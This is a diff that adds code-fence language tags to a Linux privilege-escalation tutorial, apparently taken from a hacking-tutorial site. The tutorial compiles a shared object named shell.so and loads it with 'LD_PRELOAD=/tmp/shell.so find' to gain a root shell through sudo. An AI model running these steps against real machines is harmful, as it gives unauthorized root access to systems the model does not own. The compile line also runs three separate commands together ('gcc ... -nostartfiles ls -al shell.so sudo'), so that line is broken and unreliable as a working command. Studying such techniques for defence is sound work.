@@ -6,7 +6,7 @@ To exploit such type of vulnerability we need to compromise victim’s machine a
 
 Let’s generate a C-program file inside /tmp directory for example.
 
-```
+```c
 #include <stdio.h> 
 #include <sys/types.h> 
 #include <stdlib.h> 
@@ -20,18 +20,17 @@ void _init()
 ```
 Let's compile the c program as follow:
 
-```
+```bash
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles ls -al shell.so sudo 
 ```
 ... and load the c program:
-```
+```bash
 LD_PRELOAD=/tmp/shell.so find 
 ```
 then check if we are be given the root privilege as follow:
-```
+```bash
 id 
 whoami
-
 ```
 Source: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
 
